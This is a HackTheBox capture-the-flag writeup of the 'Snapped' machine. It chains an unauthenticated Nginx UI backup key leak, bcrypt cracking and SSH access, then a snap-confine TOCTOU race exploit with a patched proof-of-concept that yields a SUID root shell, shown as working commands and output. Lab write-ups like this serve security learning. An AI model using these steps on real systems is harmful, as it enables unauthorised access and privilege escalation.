---
title: "Snapped — HackTheBox Writeup"
date: 2026-06-19
authors:
  - pexpo
categories:
  - Web Exploitation
  - Linux
tags:
  - hard
  - nginx-ui
  - cve-2026-27944
  - cve-2026-3888
  - snap-confine
  - toctou
  - bcrypt
  - htb
slug: snapped
description: "CVE-2026-27944 Nginx UI unauthenticated backup key leak → bcrypt crack → SSH → CVE-2026-3888 snap-confine TOCTOU race → SUID bash → root"
---

# Snapped — HackTheBox Writeup
**Difficulty:** Hard | **OS:** Linux (Ubuntu 24.04)

<!-- more -->

## Overview

Snapped chains two CVEs to go from zero access to root. A vhost fuzz reveals an Nginx UI admin panel running v2.3.2, vulnerable to CVE-2026-27944 — an unauthenticated `/api/backup` endpoint that leaks its own AES decryption key in the response header, handing out the SQLite database containing bcrypt hashes. Cracking one gives SSH as jonathan. From there, CVE-2026-3888 exploits a TOCTOU race between `snap-confine` (a SUID-root binary) and `systemd-tmpfiles` to inject a malicious dynamic linker and drop a SUID root bash.

**Machine IP:** 10.129.31.143  
**User flag:** f20d0d65fcdb3c776b5f56086fe24916  
**Root flag:** f20e986a53da537219ed1b34bb23bde2

---

## Recon

```bash
nmap -A -sC -Pn -v 10.129.31.143 -o nmap.txt
```

Only two ports: 22 (OpenSSH 9.6p1) and 80 (nginx 1.24.0). The web title reads "Snapped — Infrastructure. Orchestration. Control." — corporate-flavoured, suggesting a management platform somewhere.

```bash
echo "10.129.31.143 snapped.htb" | sudo tee -a /etc/hosts
```

---

## Vhost Fuzzing → Nginx UI

The main site at `snapped.htb` is a static landing page with nothing to interact with. The next step whenever you see nginx on a CTF machine is to check for virtual hosts — admin panels and APIs often live on subdomains.

First get the baseline response size to filter noise:

```bash
curl -s http://snapped.htb | wc -c
# 20199
```

Then fuzz Host headers, dropping anything that matches that size:

```bash
ffuf -u http://snapped.htb \
     -H "Host: FUZZ.snapped.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -mc 200,301,302,403 \
     -fs 20199
```

Hit: `admin.snapped.htb` returns 200 with a 1407-byte response. Add it and browse:

```bash
echo "10.129.31.143 admin.snapped.htb" | sudo tee -a /etc/hosts
```

It's an **Nginx UI** login panel — a web interface for managing Nginx configurations, SSL certs, and backups.

---

## Foothold — CVE-2026-27944 (Nginx UI Unauthenticated Backup Key Leak)

Nginx UI ≤ 2.3.2 exposes `/api/backup` with no authentication whatsoever. Worse, it includes the AES-256-CBC encryption key and IV for the backup contents in the response header `X-Backup-Security`. Returning the decryption key alongside the ciphertext provides exactly zero security — it's the digital equivalent of hiding a house key under the doormat and writing the location on the door.

```bash
curl -v http://admin.snapped.htb/api/backup -o backup.zip 2>&1
```

Response header:

```
X-Backup-Security: d6mHgzdpgfg+wglFoiDrGSOGYdnvZS9YVtXpp0/2zKU=:Gzd9gy/tLDWHY2Oo2pJuuw==
```

Format: `<base64-AES-key>:<base64-IV>`. The downloaded `backup.zip` is a standard ZIP — the outer container is unencrypted. Unzipping reveals inner files that are AES-encrypted: `hash_info.txt`, `nginx-ui.zip`, `nginx.zip`.

Decrypt them using the leaked key and IV:

```bash
KEY=$(echo -n "d6mHgzdpgfg+wglFoiDrGSOGYdnvZS9YVtXpp0/2zKU=" | base64 -d | xxd -p -c 256)
IV=$(echo -n "Gzd9gy/tLDWHY2Oo2pJuuw==" | base64 -d | xxd -p -c 256)

openssl enc -d -aes-256-cbc \
  -in backup_contents/nginx-ui.zip \
  -out nginx-ui-dec.zip \
  -K $KEY -iv $IV

openssl enc -d -aes-256-cbc \
  -in backup_contents/hash_info.txt \
  -out hash_info_dec.txt \
  -K $KEY -iv $IV
```

`hash_info_dec.txt` confirms version `2.3.2` — patched in 2.3.3. The decrypted nginx-ui archive contains `database.db`, the SQLite backend for Nginx UI.

---

## Credential Extraction + Hash Cracking

```bash
sqlite3 database.db ".tables"
sqlite3 database.db "SELECT * FROM users;"
```

Output:

```
1 | admin    | $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
2 | jonathan | $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
```

Two bcrypt hashes (`$2a$10$` = bcrypt, cost factor 10 = 1024 iterations per attempt — deliberately slow, but common passwords still fall to dictionary attacks).

```bash
cat hashes.txt
$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq

hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Result:

```
$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
```

Credentials: `jonathan:linkinpark`

---

## User Flag

```bash
ssh jonathan@10.129.31.143
# Password: linkinpark

cat ~/user.txt
f20d0d65fcdb3c776b5f56086fe24916
```

Quick checks:

```bash
id
# uid=1000(jonathan) gid=1000(jonathan) groups=1000(jonathan)
sudo -l
# Sorry, user jonathan may not run sudo on snapped.
```

No sudo, no special groups. Escalation is via a local vulnerability.

---

## Privilege Escalation — CVE-2026-3888 (snap-confine TOCTOU Race)

Checking running processes:

```bash
snap version
# snap    2.63.1+24.04
# snapd   2.63.1+24.04

find / -name snap-confine -perm -4000 2>/dev/null
# /usr/lib/snapd/snap-confine
```

`snap-confine` is a **SUID-root binary** — it runs as root regardless of who calls it. This makes it a high-value target.

### How CVE-2026-3888 Works

The vulnerability chains three conditions:

**1. `/tmp` is world-writable.** When `systemd-tmpfiles` deletes `/tmp/.snap` (its routine cleanup), any unprivileged user can immediately recreate the directory and own it.

**2. snap-confine trusts that directory.** When launching a snap app, snap-confine creates `/tmp/.snap/` and bind-mounts libraries from the snap runtime into the namespace. If the attacker controls that directory, they control what gets mounted.

**3. Malicious dynamic linker = root code execution.** By placing a fake `ld-linux-x86-64.so.2` in the attacker-owned `.snap` directory, snap-confine loads the attacker's linker with root privileges when it sets up the namespace. The payload runs as root.

The PoC uses an AF_UNIX socket to apply backpressure against snap-confine's execution, widening the race window enough to reliably win.

### Cross-Compilation

The target has no `gcc`. My Kali was running on an Apple M3 (ARM64), so cross-compilation was required:

```bash
git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
cd CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
apt install gcc-x86-64-linux-gnu -y

# Compile the malicious shared library (x86-64 inline ASM inside)
x86_64-linux-gnu-gcc -shared -fPIC -nostartfiles \
  -o librootshell.so librootshell_suid.c

# Compile the exploit binary
x86_64-linux-gnu-gcc -O2 -o exploit exploit_suid.c -lpthread

scp exploit librootshell.so jonathan@10.129.31.143:/tmp/
```

### Patching the PoC

The stock exploit consistently failed at Phase 5:

```
[!] overwrite ld-linux: No such file or directory
```

Root cause: the poisoned snap-confine process (PID 10252 etc.) died between winning the race and the `copy_file()` call — making `/proc/<pid>/root` vanish before the write could complete.

The fix is a retry loop with 50ms sleeps around the `copy_file()` call for `ld-linux`:

```c
int ld_ret = -1;
for (int attempt = 0; attempt < 20; attempt++) {
    ld_ret = copy_file(g_librootshell,
              "usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2");
    if (ld_ret == 0) break;
    usleep(50000);
}
if (ld_ret < 0) {
    perror("[!] overwrite ld-linux");
    return -1;
}
```

Recompile, transfer, run:

```bash
chmod +x /tmp/exploit_patched
/tmp/exploit_patched /tmp/librootshell.so
```

Output:

```
[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 9796
[Phase 2] Waiting for .snap deletion...
[+] .snap deleted.
[Phase 3] Destroying cached mount namespace...
[Phase 4] Setting up and running the race...
[!]   TRIGGER — swapping directories...
[+]   SWAP DONE — race won!
[Phase 5] Injecting payload into poisoned namespace...
[+]   Payload injected.
[Phase 6] Triggering root via SUID snap-confine...
[Phase 7] Verifying...
[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
================================================================
  ROOT SHELL: /var/snap/firefox/common/bash -p
================================================================
```

```bash
/var/snap/firefox/common/bash -p
```

---

## Root Flag

```bash
cat /root/root.txt
f20e986a53da537219ed1b34bb23bde2
```

---

## Things I Learned

**Encrypted backup = meaningless if you return the key.** CVE-2026-27944 is a textbook mistake — returning the AES key in the same HTTP response as the ciphertext defeats encryption entirely. Always audit backup endpoints for unauthenticated access, and never leak key material in headers.

**TOCTOU in `/tmp` is reliable without memory corruption.** The race works because SUID binaries that trust world-writable paths are inherently unsafe. The combination of `systemd-tmpfiles` deleting the directory and unprivileged users recreating it creates a consistent exploitation window.

**Public PoCs need patching.** The retry loop fix came from reading the source and understanding why the timing failed. The process died between race win and write — adding retries with 50ms backoff was the obvious fix. Reading the code is what separates using a PoC from understanding the vulnerability.

**Cross-compilation matters.** ARM Kali vs x86-64 target with no gcc on the box. Keeping `gcc-x86-64-linux-gnu` in the toolkit saves real time on these boxes.

---

*Pexpo | HTB | 19 Jun 2026*
